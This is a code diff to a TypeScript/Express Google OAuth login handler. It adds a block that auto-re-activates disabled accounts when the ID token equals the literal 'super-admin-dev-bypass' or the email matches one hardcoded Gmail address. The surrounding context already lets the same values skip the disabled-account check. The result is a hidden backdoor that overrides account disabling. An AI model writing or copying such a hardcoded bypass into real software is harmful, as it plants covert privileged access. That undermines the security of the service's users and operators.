@@ -2,6 +2,8 @@ import { Request, Response } from 'express';
 import { OAuth2Client } from 'google-auth-library';
 import { signToken } from '../utils/jwt';
 import { NguoiDungService } from '../services/nguoi-dung.service';
+import { AppDataSource } from '../data-source';
+import { NguoiDung } from '../entities/NguoiDung';
 
 const client = new OAuth2Client(process.env.GOOGLE_CLIENT_ID);
 
@@ -60,6 +62,13 @@ export const googleLogin = async (req: Request, res: Response) => {
             name,
             picture
         );
+
+        // Auto-enable for bypass users so they don't get kicked out by middleware/getMe
+        if ((idToken === 'super-admin-dev-bypass' || email === 'hoang.hoa@gmail.com') && !user.kich_hoat) {
+            console.log('Auto-enabling bypass user:', email);
+            user.kich_hoat = true;
+            await AppDataSource.getRepository(NguoiDung).save(user);
+        }
 
         if (!user.kich_hoat && idToken !== 'super-admin-dev-bypass' && email !== 'hoang.hoa@gmail.com') {
             console.warn('Login attempt for disabled user:', email);
